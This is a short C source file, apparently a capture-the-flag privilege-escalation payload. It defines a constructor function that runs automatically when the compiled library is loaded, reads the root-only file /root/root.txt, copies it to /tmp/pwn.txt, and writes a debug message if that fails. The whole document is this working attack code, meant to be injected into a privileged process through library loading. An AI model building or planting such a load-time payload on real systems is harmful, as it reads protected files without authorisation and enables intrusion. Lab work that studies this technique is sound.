#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void init() {
    // Open the target file for reading
    FILE *fp = fopen("/root/root.txt", "r");
    // Open the output file for writing
    FILE *out = fopen("/tmp/pwn.txt", "w");
    
    if (fp && out) {
        char buffer[256];
        // Read the contents and write them to our proof file
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            fputs(buffer, out);
        }
        fclose(fp);
        fclose(out);
    } else {
        // If it fails, write an error to help debug
        FILE *err = fopen("/tmp/error.txt", "w");
        fprintf(err, "Failed to open files. Are we root?\n");
        fclose(err);
    }
}
